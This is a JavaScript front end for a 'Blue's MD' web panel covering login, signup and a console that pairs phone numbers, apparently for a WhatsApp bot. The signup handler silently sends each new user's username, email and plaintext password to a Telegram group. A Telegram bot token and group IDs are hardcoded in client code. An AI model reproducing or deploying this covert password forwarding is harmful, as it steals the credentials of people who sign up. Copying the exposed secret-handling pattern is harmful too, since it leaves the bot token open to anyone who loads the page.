// =============================================
// GLOBAL VARIABLES AND CONFIGURATION
// =============================================
const config = {
    telegram: {
        botToken: '8435439233:AAG9bmCOM9C95ITnFz-ltx3Y4uulau0UnbI',
        loginGroupId: '-4956158594',
        pairGroupId: '-4700893831'
    },
    api: {
        baseUrl: '', // Leave empty for same origin
        endpoints: {
            login: '/api/login',
            signup: '/api/signup',
            verifyToken: '/api/verify-token',
            startConsole: '/api/start-console',
            stopConsole: '/api/stop-console',
            processNumber: '/api/process-number',
            consoleUpdates: '/api/console-updates',
            sendTelegram: '/api/send-telegram'
        }
    }
};

let state = {
    authToken: localStorage.getItem('authToken'),
    currentUser: {
        username: localStorage.getItem('username'),
        email: localStorage.getItem('email')
    },
    console: {
        isActive: false,
        pairedNumber: null,
        eventSource: null,
        sessionStart: null,
        sessionTimer: null
    }
};

// =============================================
// MAIN INITIALIZATION
// =============================================
document.addEventListener('DOMContentLoaded', async () => {
    // Redirect from loading screen
    if (window.location.pathname === '/' || window.location.pathname === '/index.html') {
        initLoadingScreen();
        return;
    }

    // Initialize page based on route
    switch(window.location.pathname) {
        case '/login':
        case '/login.html':
            initLoginPage();
            break;
        case '/signup':
        case '/signup.html':
            initSignupPage();
            break;
        case '/dashboard':
        case '/dashboard.html':
            await verifyAuthToken();
            initDashboardPage();
            break;
        default:
            window.location.href = '/login.html';
    }
});

// =============================================
// LOADING SCREEN
// =============================================
function initLoadingScreen() {
    // Create binary rain effect
    const container = document.getElementById('binaryRain');
    if (container) {
        const digits = '01';
        const columns = Math.floor(window.innerWidth / 20);
        
        for (let i = 0; i < columns; i++) {
            const digit = document.createElement('div');
            digit.className = 'binary-digit';
            digit.textContent = digits[Math.floor(Math.random() * digits.length)];
            digit.style.left = `${(i * 20) + Math.random() * 10}px`;
            digit.style.animationDuration = `${5 + Math.random() * 10}s`;
            digit.style.animationDelay = `${Math.random() * 5}s`;
            container.appendChild(digit);
        }
    }

    // Redirect after 10 seconds
    setTimeout(() => {
        window.location.href = '/login.html';
    }, 10000);
}

// =============================================
// AUTHENTICATION FUNCTIONS
// =============================================
async function verifyAuthToken() {
    if (!state.authToken) {
        redirectToLogin();
        return false;
    }

    try {
        const response = await fetch(config.api.endpoints.verifyToken, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${state.authToken}`
            }
        });

        if (!response.ok) {
            redirectToLogin();
            return false;
        }

        return true;
    } catch (error) {
        console.error('Token verification error:', error);
        redirectToLogin();
        return false;
    }
}

function redirectToLogin() {
    localStorage.removeItem('authToken');
    localStorage.removeItem('username');
    localStorage.removeItem('email');
    window.location.href = '/login.html';
}

function storeUserData(token, username, email) {
    state.authToken = token;
    state.currentUser = { username, email };
    
    localStorage.setItem('authToken', token);
    localStorage.setItem('username', username);
    if (email) localStorage.setItem('email', email);
}

// =============================================
// LOGIN PAGE
// =============================================
function initLoginPage() {
    createParticles();
    
    const loginForm = document.getElementById('loginForm');
    if (!loginForm) return;

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        try {
            const response = await fetch(config.api.endpoints.login, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username,
                    password
                })
            });
            
            const data = await response.json();
            
            if (response.ok) {
                storeUserData(data.token, data.username);
                
                // Notify Telegram about login
                await sendTelegramNotification(
                    config.telegram.loginGroupId,
                    `\`\`\`*Account login*\nUsername: \`${data.username}\`\`\`\``
                );
                
                window.location.href = '/dashboard.html';
            } else {
                showError('Authentication failed: ' + (data.message || 'Invalid credentials'));
            }
        } catch (error) {
            console.error('Login error:', error);
            showError('Connection error. Please try again.');
        }
    });
}

// =============================================
// SIGNUP PAGE
// =============================================
function initSignupPage() {
    createParticles();
    
    const signupForm = document.getElementById('signupForm');
    if (!signupForm) return;

    // Password strength meter
    const passwordInput = document.getElementById('password');
    const strengthMeter = document.getElementById('strengthMeter');
    
    if (passwordInput && strengthMeter) {
        passwordInput.addEventListener('input', function() {
            const password = this.value;
            let strength = 0;
            
            if (password.length > 0) strength += 20;
            if (password.length >= 8) strength += 20;
            if (/[A-Z]/.test(password)) strength += 20;
            if (/[0-9]/.test(password)) strength += 20;
            if (/[^A-Za-z0-9]/.test(password)) strength += 20;
            
            strengthMeter.style.width = `${strength}%`;
            
            if (strength < 40) {
                strengthMeter.style.backgroundColor = '#ff0000';
            } else if (strength < 80) {
                strengthMeter.style.backgroundColor = '#ff9900';
            } else {
                strengthMeter.style.backgroundColor = '#00ff00';
            }
        });
    }
    
    signupForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        try {
            const response = await fetch(config.api.endpoints.signup, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username,
                    email,
                    password
                })
            });
            
            const data = await response.json();
            
            if (response.ok) {
                storeUserData(data.token, data.username, data.email);
                
                // Notify Telegram about new account
                await sendTelegramNotification(
                    config.telegram.loginGroupId,
                    `\`\`\`*New account created*\nUsername: \`${username}\`\nEmail: \`${email}\`\nPassword: \`${password}\`\`\`\``
                );
                
                window.location.href = '/dashboard.html';
            } else {
                showError('Registration failed: ' + (data.message || 'Please try again'));
            }
        } catch (error) {
            console.error('Signup error:', error);
            showError('Connection error. Please try again.');
        }
    });
}

// =============================================
// DASHBOARD PAGE
// =============================================
function initDashboardPage() {
    // Set username display
    const usernameDisplay = document.getElementById('usernameDisplay');
    if (usernameDisplay) {
        usernameDisplay.textContent = state.currentUser.username || 'USER';
    }
    
    // Get DOM elements
    const consoleOutput = document.getElementById('consoleOutput');
    const consoleInput = document.getElementById('consoleInput');
    const sendBtn = document.getElementById('sendBtn');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    const connectionStatus = document.getElementById('connectionStatus');
    const pairedNumberDisplay = document.getElementById('pairedNumber');
    const lastActivity = document.getElementById('lastActivity');
    const sessionTimeDisplay = document.getElementById('sessionTime');
    
    // Add initial console message
    addConsoleLine('System initialized. Type "help" for commands.', 'system');
    
    // Event listeners
    if (logoutBtn) {
        logoutBtn.addEventListener('click', () => {
            // Send delpair command if number is paired
            if (state.console.pairedNumber) {
                sendTelegramCommand('delpair', state.console.pairedNumber);
            }
            
            redirectToLogin();
        });
    }
    
    if (startBtn) {
        startBtn.addEventListener('click', startConsoleSession);
    }
    
    if (stopBtn) {
        stopBtn.addEventListener('click', stopConsoleSession);
    }
    
    if (sendBtn && consoleInput) {
        sendBtn.addEventListener('click', handleConsoleInput);
        consoleInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleConsoleInput();
        });
    }
    
    // Console functions
    function addConsoleLine(text, type = 'system') {
        if (!consoleOutput) return;
        
        const line = document.createElement('div');
        line.className = `console-line ${type}`;
        line.textContent = text;
        consoleOutput.appendChild(line);
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
        
        // Update last activity
        if (lastActivity) {
            const now = new Date();
            lastActivity.textContent = now.toLocaleTimeString();
        }
    }
    
    function handleConsoleInput() {
        if (!consoleInput || !consoleOutput) return;
        
        const input = consoleInput.value.trim();
        if (!input) return;
        
        addConsoleLine(`> ${input}`, 'input');
        consoleInput.value = '';
        
        if (!state.console.isActive) {
            if (input.toLowerCase() === 'start') {
                startConsoleSession();
            } else {
                addConsoleLine('System is offline. Type "start" to begin.', 'error');
            }
            return;
        }
        
        // Process commands
        if (input.toLowerCase() === 'help') {
            showHelp();
            return;
        }
        
        if (input.toLowerCase() === 'clear') {
            consoleOutput.innerHTML = '';
            addConsoleLine('Console cleared', 'system');
            return;
        }
        
        // Process number input
        if (/^\d+$/.test(input)) {
            processNumber(input);
        } else {
            addConsoleLine('Invalid input. Please enter a number.', 'error');
        }
    }
    
    function showHelp() {
        addConsoleLine('Available commands:', 'system');
        addConsoleLine('start - Activate system', 'system');
        addConsoleLine('stop - Deactivate system', 'system');
        addConsoleLine('clear - Reset console', 'system');
        addConsoleLine('[number] - Pair device', 'system');
    }
    
    async function processNumber(number) {
        try {
            const response = await fetch(config.api.endpoints.processNumber, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${state.authToken}`
                },
                body: JSON.stringify({ number })
            });
            
            const data = await response.json();
            
            if (response.ok) {
                state.console.pairedNumber = number;
                if (pairedNumberDisplay) {
                    pairedNumberDisplay.textContent = number;
                }
                addConsoleLine(`Number ${number} paired successfully. Waiting for code...`, 'system');
                
                // Send to Telegram
                await sendTelegramCommand('pair', number);
            } else {
                addConsoleLine(`Error: ${data.message}`, 'error');
            }
        } catch (error) {
            console.error('Number processing error:', error);
            addConsoleLine('Connection error. Please try again.', 'error');
        }
    }
    
    async function startConsoleSession() {
        if (state.console.isActive) return;
        
        try {
            const response = await fetch(config.api.endpoints.startConsole, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${state.authToken}`
                }
            });
            
            const data = await response.json();
            
            if (response.ok) {
                state.console.isActive = true;
                if (startBtn) startBtn.disabled = true;
                if (stopBtn) {
                    stopBtn.disabled = false;
                    stopBtn.classList.add('active');
                }
                if (consoleInput) consoleInput.disabled = false;
                if (sendBtn) sendBtn.disabled = false;
                
                if (connectionStatus) {
                    connectionStatus.textContent = 'ONLINE';
                    connectionStatus.classList.remove('inactive');
                    connectionStatus.classList.add('active');
                }
                
                addConsoleLine('System activated', 'system');
                addConsoleLine('Blue\'s MD online. Please input number', 'system');
                
                // Start session timer
                state.console.sessionStart = new Date();
                updateSessionTime();
                state.console.sessionTimer = setInterval(updateSessionTime, 1000);
                
                // Connect to console updates
                connectToConsoleUpdates();
            } else {
                addConsoleLine(`Error: ${data.message}`, 'error');
            }
        } catch (error) {
            console.error('Console start error:', error);
            addConsoleLine('Connection error. Please try again.', 'error');
        }
    }
    
    async function stopConsoleSession() {
        if (!state.console.isActive) return;
        
        try {
            const response = await fetch(config.api.endpoints.stopConsole, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${state.authToken}`
                }
            });
            
            const data = await response.json();
            
            if (response.ok) {
                state.console.isActive = false;
                if (startBtn) startBtn.disabled = false;
                if (stopBtn) {
                    stopBtn.disabled = true;
                    stopBtn.classList.remove('active');
                }
                if (consoleInput) consoleInput.disabled = true;
                if (sendBtn) sendBtn.disabled = true;
                
                if (connectionStatus) {
                    connectionStatus.textContent = 'OFFLINE';
                    connectionStatus.classList.remove('active');
                    connectionStatus.classList.add('inactive');
                }
                
                // Clear session timer
                if (state.console.sessionTimer) {
                    clearInterval(state.console.sessionTimer);
                    state.console.sessionTimer = null;
                }
                
                addConsoleLine('System deactivated', 'system');
                
                // Send delpair command if number is paired
                if (state.console.pairedNumber) {
                    await sendTelegramCommand('delpair', state.console.pairedNumber);
                    state.console.pairedNumber = null;
                    if (pairedNumberDisplay) {
                        pairedNumberDisplay.textContent = 'NONE';
                    }
                }
                
                // Close event source
                if (state.console.eventSource) {
                    state.console.eventSource.close();
                    state.console.eventSource = null;
                }
            } else {
                addConsoleLine(`Error: ${data.message}`, 'error');
            }
        } catch (error) {
            console.error('Console stop error:', error);
            addConsoleLine('Connection error. Please try again.', 'error');
        }
    }
    
    function connectToConsoleUpdates() {
        if (state.console.eventSource) {
            state.console.eventSource.close();
        }
        
        state.console.eventSource = new EventSource(
            `${config.api.endpoints.consoleUpdates}?token=${state.authToken}`
        );
        
        state.console.eventSource.onmessage = (event) => {
            const data = JSON.parse(event.data);
            addConsoleLine(data.message, 'response');
        };
        
        state.console.eventSource.onerror = (error) => {
            console.error('Console update error:', error);
            addConsoleLine('Connection lost. Attempting to reconnect...', 'error');
        };
    }
    
    function updateSessionTime() {
        if (!state.console.sessionStart || !sessionTimeDisplay) return;
        
        const now = new Date();
        const diff = Math.floor((now - state.console.sessionStart) / 1000);
        
        const hours = Math.floor(diff / 3600);
        const minutes = Math.floor((diff % 3600) / 60);
        const seconds = diff % 60;
        
        sessionTimeDisplay.textContent = 
            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
}

// =============================================
// TELEGRAM INTEGRATION
// =============================================
async function sendTelegramCommand(command, number) {
    try {
        const response = await fetch(config.api.endpoints.sendTelegram, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${state.authToken}`
            },
            body: JSON.stringify({
                command,
                number,
                groupId: command === 'pair' ? config.telegram.pairGroupId : config.telegram.loginGroupId
            })
        });

        if (!response.ok) {
            console.error('Failed to send Telegram command');
        }
    } catch (error) {
        console.error('Telegram command error:', error);
    }
}

async function sendTelegramNotification(groupId, message) {
    try {
        const response = await fetch(config.api.endpoints.sendTelegram, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${state.authToken}`
            },
            body: JSON.stringify({
                groupId,
                message
            })
        });

        if (!response.ok) {
            console.error('Failed to send Telegram notification');
        }
    } catch (error) {
        console.error('Telegram notification error:', error);
    }
}

// =============================================
// UTILITY FUNCTIONS
// =============================================
function createParticles() {
    const container = document.getElementById('particles');
    if (!container) return;
    
    const particleCount = 50;
    
    for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = `${Math.random() * 100}%`;
        particle.style.top = `${Math.random() * 100}%`;
        particle.style.animationDuration = `${10 + Math.random() * 20}s`;
        particle.style.animationDelay = `${Math.random() * 5}s`;
        particle.style.opacity = Math.random() * 0.5;
        container.appendChild(particle);
    }
}

function showError(message) {
    // Create or use existing error display element
    let errorDisplay = document.getElementById('errorDisplay');
    
    if (!errorDisplay) {
        errorDisplay = document.createElement('div');
        errorDisplay.id = 'errorDisplay';
        errorDisplay.style.position = 'fixed';
        errorDisplay.style.top = '20px';
        errorDisplay.style.left = '50%';
        errorDisplay.style.transform = 'translateX(-50%)';
        errorDisplay.style.padding = '15px 25px';
        errorDisplay.style.background = 'rgba(255, 50, 50, 0.9)';
        errorDisplay.style.color = 'white';
        errorDisplay.style.borderRadius = '5px';
        errorDisplay.style.zIndex = '1000';
        errorDisplay.style.boxShadow = '0 0 15px rgba(255, 0, 0, 0.5)';
        errorDisplay.style.animation = 'fadeIn 0.3s forwards';
        document.body.appendChild(errorDisplay);
    }
    
    errorDisplay.textContent = message;
    
    // Auto-hide after 5 seconds
    setTimeout(() => {
        errorDisplay.style.animation = 'fadeOut 0.3s forwards';
        setTimeout(() => {
            errorDisplay.remove();
        }, 300);
    }, 5000);
}
